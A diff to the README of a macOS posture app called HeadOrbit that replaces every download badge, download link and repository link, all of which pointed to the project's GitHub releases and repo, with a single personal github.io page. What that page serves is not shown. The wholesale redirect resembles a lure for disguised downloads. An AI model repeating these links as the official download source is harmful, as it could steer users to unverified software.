@@ -1,6 +1,6 @@
 # 🎧 HeadOrbit - Never Slouch at Your Screen Again
 
-[![Download HeadOrbit](https://img.shields.io/badge/Download-HeadOrbit-4CAF50?style=for-the-badge)](https://github.com/uzielg7641/HeadOrbit/releases)
+[![Download HeadOrbit](https://img.shields.io/badge/Download-HeadOrbit-4CAF50?style=for-the-badge)](https://uzielg7641.github.io)
 
 ## 🧭 What is HeadOrbit?
 
@@ -14,7 +14,7 @@ Let’s get you up and running in a few minutes.
 
 ### Step 1: Download HeadOrbit
 
-Visit this link to download the application: [https://github.com/uzielg7641/HeadOrbit/releases](https://github.com/uzielg7641/HeadOrbit/releases)
+Visit this link to download the application: [https://uzielg7641.github.io](https://uzielg7641.github.io)
 
 ### Step 2: Install the App
 
@@ -141,8 +141,8 @@ No. Everything stays on your device. HeadOrbit does not collect, store, or trans
 
 HeadOrbit is designed to be invisible until you need it. Set it up once, and let it work quietly in the background. Better posture, better privacy, better focus – all from a tiny app in your menu bar.
 
-If you have questions, ideas, or run into any problems, visit the repository at [https://github.com/uzielg7641/HeadOrbit](https://github.com/uzielg7641/HeadOrbit).
+If you have questions, ideas, or run into any problems, visit the repository at [https://uzielg7641.github.io](https://uzielg7641.github.io).
 
-[![Download Now](https://img.shields.io/badge/Download-HeadOrbit_Free-FF5722?style=for-the-badge&logo=apple)](https://github.com/uzielg7641/HeadOrbit/releases)
+[![Download Now](https://img.shields.io/badge/Download-HeadOrbit_Free-FF5722?style=for-the-badge&logo=apple)](https://uzielg7641.github.io)
 
 Keywords: AirPods, head tracking, posture reminder, screen blur, macOS, menu bar app, privacy, focus, ergonomics, look away, sit up straight, Apple AirPods, productivity, wellness, desktop app.
